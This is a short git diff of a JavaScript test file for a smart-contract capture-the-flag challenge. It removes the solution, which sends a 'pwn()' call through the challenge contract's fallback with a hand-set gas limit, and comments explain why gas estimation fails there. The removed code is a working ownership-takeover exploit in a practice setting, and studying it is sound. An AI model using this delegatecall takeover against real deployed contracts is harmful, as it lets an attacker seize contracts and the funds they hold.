@@ -20,30 +20,6 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
-  const delegateeAbi = ["function pwn()"];
-  let iface = new ethers.utils.Interface(delegateeAbi);
-  const data = iface.encodeFunctionData(`pwn`, [])
-
-  tx = await eoa.sendTransaction({
-    from: await eoa.getAddress(),
-    to: challenge.address,
-    data,
-    // estimating gas fails! because fallback does not revert when inner call fails
-    // The catch about gas estimation is that the node will try out your tx
-    // with different gas values, and return the lowest one for which your tx
-    // doesn't fail. But it only looks at your tx, not at any of the internal call
-    // it makes. This means that if the contract code you're calling has a
-    // try/catch that causes it not to revert if an internal call does,
-    // you can get a gas estimation that would be enough for the caller contract,
-    // but not for the callee.
-    // https://gist.github.com/spalladino/a349f0ca53dbb5fc3914243aaf7ea8c6
-    gasLimit: BigNumber.from(`100000`),
-  })
-
-  // tx = await challenge.fallback({
-  //   data,
-  // })
-  await tx.wait();
 });
 
 after(async () => {
